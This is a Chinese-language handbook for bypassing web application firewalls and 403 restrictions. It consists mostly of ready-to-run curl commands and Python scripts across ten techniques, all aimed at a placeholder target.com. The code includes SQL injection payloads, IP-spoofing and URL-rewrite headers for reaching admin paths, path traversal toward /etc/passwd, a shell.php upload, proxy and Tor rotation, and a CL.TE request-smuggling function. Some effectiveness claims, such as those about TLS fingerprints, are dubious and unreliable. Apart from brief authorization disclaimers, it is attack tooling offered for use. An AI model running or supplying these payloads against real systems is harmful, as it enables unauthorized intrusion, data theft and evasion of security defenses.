# WAF/403 绕过手册

> **合规声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得明确书面授权后进行任何安全测试活动。

---

## 目录

1. [Python requests 绕过](#1-python-requests-绕过最有效tls指纹不同)
2. [HTTP 方法混淆](#2-http-方法混淆)
3. [绕过 Header 大全](#3-绕过-header-大全)
4. [路径编码技巧](#4-路径编码技巧)
5. [Content-Type 切换](#5-content-type-切换)
6. [参数走私](#6-参数走私)
7. [HTTP 版本降级](#7-http-版本降级)
8. [Case 混淆](#8-case-混淆)
9. [IP 轮换](#9-ip-轮换)
10. [分块传输绕过](#10-分块传输绕过)

---

## 1. Python requests 绕过（最有效，TLS指纹不同）

### 原理
许多 WAF（如 Cloudflare、Akamai）基于 TLS 握手指纹（JA3/JA3S）识别并阻止自动化工具。Python `requests` 库的默认 TLS 指纹与浏览器不同，反而不容易被某些 WAF 的自动化指纹检测模块匹配。结合自定义 User-Agent 和延迟策略，可绕过部分 WAF。

### Python 示例

```python
import requests
import time
import random

# 基础绕过配置
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Connection": "keep-alive",
})

# 模拟人类行为延迟
def human_delay():
    time.sleep(random.uniform(1.0, 3.0))

def request_with_bypass(url, params=None):
    human_delay()
    # 随机选择 IP 轮换（如果有代理池）
    proxies = None
    # proxies = {"http": "http://proxy:8080", "https": "http://proxy:8080"}
    try:
        resp = session.get(url, params=params, proxies=proxies, timeout=15)
        return resp
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return None

# 使用 TLS 指纹更低的库: requests-tls (pip install requests-tls)
# from requests_tls import TlsSession
# session = TlsSession()
# session.headers.update({...})
```

### 有效目标
- Cloudflare（对 Python `requests` 的 TLS 指纹没有 Chrome 那么强的检测）
- 部分自定义 WAF（未启用 JA3 指纹库）
- 对 ModSecurity 默认规则同样有效

---

## 2. HTTP 方法混淆

### 原理
WAF 通常只检查 GET 和 POST 请求中的常见攻击模式，但对其他 HTTP 方法的处理可能不严格。通过切换/混淆 HTTP 方法，可以绕过基于方法的规则检测。

### 常见方法切换列表
```
GET → POST → PUT → DELETE → PATCH → OPTIONS → HEAD → TRACE → CONNECT
```

### curl 示例

```bash
# 原始 GET 请求被拦截
curl -X GET "https://target.com/api/users?id=1 UNION SELECT * FROM users"

# 改用 POST，参数放在 body 中
curl -X POST "https://target.com/api/users" -d "id=1 UNION SELECT * FROM users"

# 改用 PUT
curl -X PUT "https://target.com/api/users" -d "id=1 UNION SELECT * FROM users"

# 改用 PATCH
curl -X PATCH "https://target.com/api/users" -d "id=1 UNION SELECT * FROM users"

# 改用 OPTIONS（有些框架会反射参数）
curl -X OPTIONS "https://target.com/api/users?id=1 UNION SELECT * FROM users"

# 改用 HEAD（WAF 可能不检查 HEAD 响应体）
curl -X HEAD "https://target.com/api/users?id=1 UNION SELECT * FROM users"

# 使用自定义方法
curl -X FAKEMETHOD "https://target.com/api/users?id=1 UNION SELECT * FROM users"
```

### Python 示例

```python
import requests

url = "https://target.com/api/users"
payload = {"id": "1 UNION SELECT * FROM users"}

# 方法轮询
for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
    try:
        if method == "GET":
            r = requests.get(url, params=payload)
        elif method == "POST":
            r = requests.post(url, data=payload)
        elif method == "PUT":
            r = requests.put(url, data=payload)
        elif method == "PATCH":
            r = requests.patch(url, data=payload)
        elif method == "DELETE":
            r = requests.delete(url, data=payload)
        elif method == "OPTIONS":
            r = requests.options(url, data=payload)
        elif method == "HEAD":
            r = requests.head(url, params=payload)
        print(f"[{method}] Status: {r.status_code}, Length: {len(r.content)}")
        if r.status_code == 200 and len(r.content) > 100:
            print(f"[+] Possible bypass with {method}!")
            break
    except Exception as e:
        print(f"[{method}] Error: {e}")
```

### 有效目标
- ModSecurity 默认规则
- AWS WAF（部分规则只检查 GET/POST）
- 自定义 WAF（对非标准方法检测较弱）
- Nginx `if` 指令限制（方法检查不全面）

---

## 3. 绕过 Header 大全

### 原理
WAF 和反向代理基于请求头判断客户端真实信息。通过添加/修改特定 Header，可以欺骗 WAF 认为请求来自可信源，或绕过 IP 白名单限制。

### Header 列表（15+种）

| Header | 作用 | 场景 |
|--------|------|------|
| `X-Forwarded-For` | 伪造客户端 IP | IP 限制绕过 |
| `X-Real-IP` | 伪造真实 IP | Nginx 后端绕过 |
| `X-Original-URL` | 重写请求路径 | 路径限制绕过 |
| `X-Rewrite-URL` | 重写请求 URL | 路径限制绕过 |
| `X-Forwarded-Host` | 伪造目标主机 | 虚拟主机限制绕过 |
| `X-Forwarded-Proto` | 伪造协议（http/https） | 协议检查绕过 |
| `X-Forwarded-Scheme` | 伪造协议 | 同上 |
| `Client-IP` | 伪造客户端 IP | IP 限制绕过 |
| `X-Client-IP` | 伪造客户端 IP | IP 限制绕过 |
| `X-Remote-IP` | 伪造远程 IP | IP 限制绕过 |
| `X-Remote-Addr` | 伪造远程地址 | IP 限制绕过 |
| `X-HTTP-Method-Override` | 覆盖 HTTP 方法 | 方法检查绕过 |
| `X-HTTP-Method` | 覆盖 HTTP 方法 | 同上 |
| `X-Method-Override` | 覆盖 HTTP 方法 | 同上 |
| `X-Forwarded-Prefix` | 路径前缀修改 | API Gateway 绕过 |
| `CF-Connecting-IP` | Cloudflare 真实 IP | 伪造 Cloudflare 来源 |
| `True-Client-IP` | Cloudflare/Akamai 真实 IP | 伪造 CDN 来源 |
| `X-Originating-IP` | 原始 IP | IP 限制 |
| `X-Custom-IP-Authorization` | 自定义 IP 授权 | AWS ALB/内网绕过 |

### Python 批量测试示例

```python
import requests

url = "https://target.com/admin"
ip_headers = [
    "X-Forwarded-For",
    "X-Real-IP",
    "Client-IP",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Originating-IP",
    "X-Custom-IP-Authorization",
    "CF-Connecting-IP",
    "True-Client-IP",
]

# 内网地址常见绕过值
internal_ips = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "172.16.0.1",
    "192.168.1.1",
    "::1",
]

for header in ip_headers:
    for ip in internal_ips:
        headers = {header: ip}
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code != 403 and r.status_code != 400:
                print(f"[+] Bypass! {header}: {ip} -> {r.status_code} ({len(r.content)} bytes)")
        except Exception as e:
            pass
```

### 路径限制绕过 Header

```bash
# X-Original-URL 绕过路径限制
curl -X GET "https://target.com/" -H "X-Original-URL: /admin"

# X-Rewrite-URL 变体
curl -X GET "https://target.com/" -H "X-Rewrite-URL: /admin"

# 结合 X-Forwarded-For 内网绕过
curl -X GET "https://target.com/admin" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Original-URL: /admin/console"
```

### 有效目标
- AWS ALB/CloudFront（`X-Original-URL` 对部分配置有效）
- SharePoint / IIS（`X-Rewrite-URL`）
- 内网 IP 白名单系统
- Nginx 反向代理（`X-Real-IP` 绕过 IP 白名单）

---

## 4. 路径编码技巧

### 原理
WAF 依赖 URL 路径模式匹配来检测攻击。通过编码、截断、混淆路径，可以绕过基于路径的规则。

### 编码技巧清单

```bash
# 1. URL 单编码
curl "https://target.com/%61%64%6d%69%6e"   # admin

# 2. 双编码
curl "https://target.com/%2561%2564%256d%2569%256e"   # admin（%25 → %）

# 3. 三重编码
curl "https://target.com/%252561%252564%25256d%252569%25256e"

# 4. 路径截断
curl "https://target.com/admin..;/"
curl "https://target.com/admin..%00/"
curl "https://target.com/admin%00/"
curl "https://target.com/admin%20/"
curl "https://target.com/admin%09/"
curl "https://target.com/admin/."
curl "https://target.com/admin/./"

# 5. 路径参数混淆
curl "https://target.com/;admin/"
curl "https://target.com/;foo=bar/admin/"
curl "https://target.com/admin;foo=bar/"
curl "https://target.com/..;/admin/"
curl "https://target.com/..%3b/admin/"

# 6. 大小写混用
curl "https://target.com/AdMiN/"
curl "https://target.com/aDmIn/"

# 7. 点号替代斜杠
curl "https://target.com/admin..;/..;/etc/passwd"

# 8. 反斜杠替代
curl "https://target.com/..\\admin\\"

# 9. Tab/空格编码
curl "https://target.com/ad%09min/"
curl "https://target.com/ad%20min/"

# 10. Unicode 编码
curl "https://target.com/%u0061%u0064%u006d%u0069%u006e/"  # a = 'a'

# 11. 过长路径填充
curl "https://target.com/admin/"+$(python3 -c "print('A'*4096)")+"/"

# 12. /./ 插入
curl "https://target.com/./admin/./console/"
```

### SQL 注入中的编码绕过

```bash
# 空字节分隔
curl "https://target.com/api?id=1%00'union%00select%001,2,3--"

# 注释混淆
curl "https://target.com/api?id=1/**/union/**/select/**/1,2,3--"

# 十六进制编码
curl "https://target.com/api?id=1 union select 1,0x61646d696e,3--"

# 利用 %a0 (NBSP) 绕过
curl "https://target.com/api?id=1%a0union%a0select%a01,2,3--"
```

### 有效目标
- WAF 使用简单字符串匹配规则（无规范化）
- Nginx/Apache 访问控制
- Tomcat/JBoss 双编码解析差异
- IIS（对 `..;/` 截断特别敏感）

---

## 5. Content-Type 切换

### 原理
WAF 根据 Content-Type 选择检测规则。不同解析器对同一 payload 的解析结果不同，通过切换 Content-Type 可以绕过特定规则。

### 常见 Content-Type 切换

```bash
# 1. JSON → WAF 使用 JSON 解析器
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456","role":"admin"}'

# 2. XML → 可能绕过 JSON 规则
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/xml" \
  -d '<root><username>admin</username><password>123456</password><role>admin</role></root>'

# 3. Form URL-encoded → 标准
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=123456&role=admin"

# 4. Multipart → 分段传输，可能绕过
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: multipart/form-data; boundary=----BOUNDARY" \
  -d $'------BOUNDARY\r\nContent-Disposition: form-data; name="username"\r\n\r\nadmin\r\n------BOUNDARY\r\nContent-Disposition: form-data; name="password"\r\n\r\n123456\r\n------BOUNDARY\r\nContent-Disposition: form-data; name="role"\r\n\r\nadmin\r\n------BOUNDARY--'

# 5. Text/plain → 规则最少
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: text/plain" \
  -d '{"username":"admin","password":"123456"}'

# 6. 混合类型（设置 Content-Type 与实际数据不符）
curl -X POST "https://target.com/api/upload" \
  -H "Content-Type: application/json" \
  -F "file=@shell.php"  # XML Multipart 混合欺骗
```

### Python Content-Type 自动切换测试

```python
import requests
import json

url = "https://target.com/api/data"
payload = {"id": "1 UNION SELECT * FROM users", "name": "test"}

content_types = [
    ("application/json", lambda p: json.dumps(p)),
    ("application/xml", lambda p: f"<root><id>{p['id']}</id></root>"),
    ("application/x-www-form-urlencoded", lambda p: "&".join(f"{k}={v}" for k, v in p.items())),
    ("multipart/form-data", lambda p: None),  # 需要使用 files 参数
    ("text/plain", lambda p: json.dumps(p)),
    ("application/xhtml+xml", lambda p: json.dumps(p)),
    ("application/octet-stream", lambda p: json.dumps(p)),
]

for ct, encoder in content_types:
    headers = {"Content-Type": ct}
    data = encoder(payload)
    try:
        if ct == "multipart/form-data":
            r = requests.post(url, files={"file": ("data.txt", payload["id"])})
        else:
            r = requests.post(url, data=data, headers=headers)
        print(f"[{ct}] Status: {r.status_code}, Length: {len(r.content)}")
        if r.status_code == 200:
            print(f"  [+] Possible bypass!")
    except Exception as e:
        print(f"[{ct}] Error: {e}")
```

### 有效目标
- AWS WAF（JSON/XML 规则集可能不全覆盖）
- Cloudflare WAF（Content-Type 切换可绕过部分托管规则）
- ModSecurity（仅检查 `application/x-www-form-urlencoded` 的规则）

---

## 6. 参数走私

### 原理
不同后端（WAF → 应用服务器）对重复参数的处理方式不同。WAF 可能检查第一个参数，而应用使用最后一个参数（或反之），造成绕过。

### 常见解析差异

```
后端 1（Tomcat/Apache/PHP/Express）  后端 2（WAF）
PHP:      最后一个参数生效          第一个参数生效
ASP.NET:  合并逗号分隔              取第一个
Tomcat:   取第一个（取决于配置）     取最后一个
Express:  取最后一个                 取第一个
Python:   取最后一个（MultiDict）    取第一个
```

### 示例

```bash
# 参数重复 — WAF 检查干净参数，应用使用恶意参数
curl "https://target.com/search?q=benign&q=malicious' UNION SELECT * FROM users--"

# HPP (HTTP Parameter Pollution) — 利用列表解析差异
curl "https://target.com/api/users?id=1&id=2&id=3"

# 参数名混淆（WAF 不认识自定义格式）
curl "https://target.com/api?id[]=1 UNION SELECT * FROM users"
curl "https://target.com/api?id[0]=1 UNION SELECT * FROM users"
curl "https://target.com/api?user.id=1 UNION SELECT * FROM users"
curl "https://target.com/api?user[id]=1 UNION SELECT * FROM users"

# 参数值中用 = 和 & 混淆解析
curl "https://target.com/api?key=value&id=1 UNION SELECT * FROM users&dummy=val"

# 空参数/缺失参数
curl "https://target.com/api?id="
curl "https://target.com/api?id"
curl "https://target.com/api?&"
```

### Python 批量测试

```python
import requests
import itertools

url = "https://target.com/api/data"
base_params = {"id": "1"}

# 避免常见 WAF 模式的参数值
payloads = [
    {"id": "1 UNION SELECT * FROM users--"},
    {"id": "1", "id": "1 UNION SELECT * FROM users--"},
    {"id[]": "1 UNION SELECT * FROM users"},
    {"id[0]": "1 UNION SELECT * FROM users"},
    {"id": "", "id": "1 UNION SELECT * FROM users--"},
]

# 由于 Python dict 不能有重复键，使用 requests 的 params 传元组列表
param_sets = [
    [("id", "1")],                                              # 单参数
    [("id", "1"), ("id", "1' UNION SELECT 1,2,3--")],          # 重复参数
    [("id", "1"), ("id", "1"), ("id", "1' UNION SELECT 1,2,3--")], # 三重
    [("name", "test"), ("id", "1' UNION SELECT 1,2,3--")],     # 不同参数名
]

for params in param_sets:
    try:
        r = requests.get(url, params=params, timeout=5)
        if r.status_code == 200 and "error" not in r.text.lower():
            print(f"[+] Bypass with params: {params}")
            print(f"    Status: {r.status_code}, Length: {len(r.content)}")
    except Exception as e:
        print(f"[!] Error: {e}")
```

### 有效目标
- AWS WAF / CloudFront（参数解析与后端不一致）
- Akamai（对参数数量不敏感）
- PHP + Nginx 组合（Nginx 传第一个，PHP 取最后一个）
- ASP.NET + IIS（逗号拼接策略绕过）

---

## 7. HTTP 版本降级

### 原理
许多 WAF 对 HTTP/2 实施了高级检测规则，但对 HTTP/1.0 或 HTTP/1.1 的早期版本的检测较弱。降级到 HTTP/1.0 可能绕过特定规则。

### curl 示例

```bash
# HTTP/1.0 请求（默认 curl 使用 HTTP/1.1）
curl --http1.0 "https://target.com/api?id=1 UNION SELECT 1,2,3--"

# HTTP/1.1
curl --http1.1 "https://target.com/api?id=1 UNION SELECT 1,2,3--"

# HTTP/2（默认，如果服务器支持）
curl --http2 "https://target.com/api?id=1 UNION SELECT 1,2,3--"

# HTTP/2 优先级帧混淆
curl --http2-prior-knowledge "https://target.com/api?id=1 UNION SELECT 1,2,3--"
```

### Python 示例（使用 httpx 支持 HTTP/2）

```python
# pip install httpx h2
import httpx

url = "https://target.com/api"
params = {"id": "1 UNION SELECT 1,2,3--"}

# HTTP/1.1
with httpx.Client(http2=False) as client:
    r = client.get(url, params=params)
    print(f"[HTTP/1.1] Status: {r.status_code}, Length: {len(r.content)}")

# HTTP/2
with httpx.Client(http2=True) as client:
    r = client.get(url, params=params)
    print(f"[HTTP/2] Status: {r.status_code}, Length: {len(r.content)}")
```

### 有效目标
- Cloudflare（HTTP/2 规则集有时比 HTTP/1.1 更严格）
- F5 BIG-IP（HTTP/1.0 可能绕过协议强制规则）
- 部分 CDN 服务（低版本协议检测较弱）

---

## 8. Case 混淆

### 原理
WAF 使用简单正则匹配 SQL 关键字，大小写混合可绕过区分大小写的规则。

### 示例

```bash
# 关键字大小写混合
curl "https://target.com/api?id=1 UniOn SeLeCt 1,2,3--"

# 全大写
curl "https://target.com/api?id=1 UNION SELECT 1,2,3--"

# 关键字中间插入特殊字符
curl "https://target.com/api?id=1 UN/**/ION SEL/**/ECT 1,2,3--"

# 关键字拆分
curl "https://target.com/api?id=1 UNIO%4E SELECT 1,2,3--"
curl "https://target.com/api?id=1 UNI\x4F\x4E SELECT 1,2,3--"

# 大小写 + 注释混用
curl "https://target.com/api?id=1/**/UnIoN/**/sElEcT/**/1,2,3--"

# 利用花括号（MySQL 扩展）
curl "https://target.com/api?id={$asd} UNION SELECT 1,2,3--"
```

### Python 自动化

```python
import requests
import itertools

url = "https://target.com/api"
base_sql = "union select 1,2,3"

def case_variations(word):
    """生成关键字的大小写变体"""
    variants = set()
    if len(word) <= 3:
        return [word.lower(), word.upper(), word.capitalize()]
    # 每个位置大小写排列（限制长度避免爆炸）
    for i in range(1, len(word)):
        v = word[:i].lower() + word[i:].upper()
        variants.add(v)
        v = word[:i].upper() + word[i:].lower()
        variants.add(v)
    variants.add(word.lower())
    variants.add(word.upper())
    return list(variants)

# 测试不同的 case 组合
union_variants = case_variations("union")
select_variants = case_variations("select")

for u in union_variants[:5]:  # 限制数量
    for s in select_variants[:5]:
        payload = f"1 {u} {s} 1,2,3--"
        try:
            r = requests.get(url, params={"id": payload}, timeout=5)
            if r.status_code == 200:
                print(f"[+] Possible bypass: {payload}")
        except:
            pass
```

### 有效目标
- ModSecurity OWASP CRS（正则匹配，大小写敏感规则）
- AWS WAF SQL 注入规则集
- 使用简单字符串匹配的自定义 WAF

---

## 9. IP 轮换

### 原理
WAF 根据请求频率和来源 IP 进行限速和拦截。通过轮换 IP 地址可以绕过基于 IP 的频率限制和黑名单。

### 方法

#### 方法 1：免费代理轮换

```python
import requests
from itertools import cycle

proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080",
]

proxy_pool = cycle(proxies)
url = "https://target.com/api"

for i in range(10):
    proxy = next(proxy_pool)
    try:
        r = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=5)
        print(f"[{i}] Proxy {proxy}: {r.status_code}")
    except Exception as e:
        print(f"[{i}] Proxy {proxy}: Failed - {e}")
```

#### 方法 2：Tor 代理

```python
import requests

# 需要运行 Tor 服务
proxies = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050",
}

def new_tor_identity():
    """通过 Tor 控制端口更换 IP"""
    import socket
    ctrl = socket.socket()
    ctrl.connect(("127.0.0.1", 9051))
    ctrl.send(b"AUTHENTICATE\r\n")
    resp = ctrl.recv(1024)
    ctrl.send(b"SIGNAL NEWNYM\r\n")
    resp = ctrl.recv(1024)
    ctrl.close()

r = requests.get("https://target.com/api", proxies=proxies)
print(f"Current IP via Tor: {r.status_code}")
```

#### 方法 3：住宅代理（付费，推荐）

```python
# 使用芝麻/快代理等住宅代理服务
proxies = {
    "http": "http://username:password@gateway.dynamic.proxy.com:8080",
    "https": "http://username:password@gateway.dynamic.proxy.com:8080",
}
r = requests.get("https://target.com/api", proxies=proxies)
```

### 有效目标
- 基于 IP 频率限制的 WAF
- Cloudflare 速率限制（非人类行为的速率限制）
- 登录页面爆破锁定

---

## 10. 分块传输绕过

### 原理
利用 HTTP 分块传输编码（Transfer-Encoding: chunked）编码 payload，使 WAF 无法正确解析请求体内容。

### 基础分块示例

```bash
# 正常请求：未编码
curl -X POST "https://target.com/api/login" \
  -d "username=admin' OR '1'='1--&password=test"

# 分块传输：手动构造
printf "POST /api/login HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" > payload.txt
printf "15\r\nusername=admin' OR '\r\n" >> payload.txt
printf "7\r\n1'='1--\r\n" >> payload.txt
printf "11\r\n&password=test\r\n" >> payload.txt
printf "0\r\n\r\n" >> payload.txt
nc target.com 80 < payload.txt
```

### Python 分块传输绕过

```python
import requests

url = "https://target.com/api/login"

# 方法1：使用 requests 的分块传输
def chunked_generator():
    """生成分块 payload：将敏感关键字分到不同 chunk"""
    chunks = [
        b"username=admin' O",
        b"R '1'='1",
        b"--&password=test"
    ]
    for chunk in chunks:
        yield chunk

# requests 支持 chunked 上传
r = requests.post(url, data=chunked_generator(), headers={
    "Content-Type": "application/x-www-form-urlencoded",
    # 不要设置 Content-Length，自动使用 Transfer-Encoding: chunked
})
print(f"Status: {r.status_code}")
```

### 分块与 TE 走私（CL.TE / TE.CL）

```python
import socket

def cl_te_bypass(host, port, path, payload):
    """CL.TE：WAF 使用 Content-Length，后端使用 Transfer-Encoding"""
    body = f"0\r\n\r\nPOST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\n\r\n{payload}"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # 伪造请求：WAF 看到的内容长度与后端不同
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    )
    sock.send(request.encode())
    response = sock.recv(4096)
    sock.close()
    return response

# 使用
result = cl_te_bypass("target.com", 80, "/api", "id=1 UNION SELECT * FROM users")
print(result.decode(errors="ignore"))
```

### 有效目标
- AWS WAF（经典分块编码解析不完整）
- Cloudflare WAF（部分托管规则无法解析分块）
- F5 ASM（分块编码绕过特定签名）
- ModSecurity（默认不检查 chunked body）

---

## 综合绕过策略

### 多层组合绕过

最有效的绕过通常是多种技术的组合：

```python
import requests

def combined_bypass(url, malicious_payload):
    """
    组合绕过策略：
    - Python requests TLS 指纹
    - X-Forwarded-For 内网 IP
    - 分块传输
    - Content-Type 切换
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "Cache-Control": "no-cache",
    })

    # 分块 generator
    def chunked_payload():
        half = len(malicious_payload) // 2
        yield malicious_payload[:half].encode()
        yield malicious_payload[half:].encode()

    # 尝试不同 Content-Type
    for ct in ["application/x-www-form-urlencoded", "multipart/form-data"]:
        try:
            if ct == "multipart/form-data":
                r = session.post(url, files={"data": ("p.txt", malicious_payload)})
            else:
                r = session.post(url, data=chunked_payload(), headers={"Content-Type": ct})
            print(f"[{ct}] {r.status_code}")
            if r.status_code == 200:
                return r
        except:
            pass
    return None
```

---

## 总结

| 技术 | 有效 WAF | 难度 | 成功率 |
|------|---------|------|--------|
| Python requests | Cloudflare, 通用 | 低 | 中 |
| HTTP 方法混淆 | ModSecurity, AWS | 低 | 中 |
| Header IP 伪造 | Nginx, ALB | 中 | 高（配置不当） |
| 路径编码 | IIS, Tomcat | 中 | 高 |
| Content-Type 切换 | Cloudflare, AWS | 中 | 中 |
| 参数走私 | PHP+Nginx | 高 | 高 |
| HTTP 版本降级 | Cloudflare, F5 | 低 | 低-中 |
| Case 混淆 | 正则 WAF | 低 | 中 |
| IP 轮换 | 限速 WAF | 中 | 高 |
| 分块传输 | ModSecurity, AWS | 高 | 高 |

> **重要提醒**: 所有技术仅在获得授权的情况下使用。对不同 WAF 时，建议从最简单的技术开始尝试，逐步增加复杂度。组合使用多种技术通常可获得最佳的绕过效果。
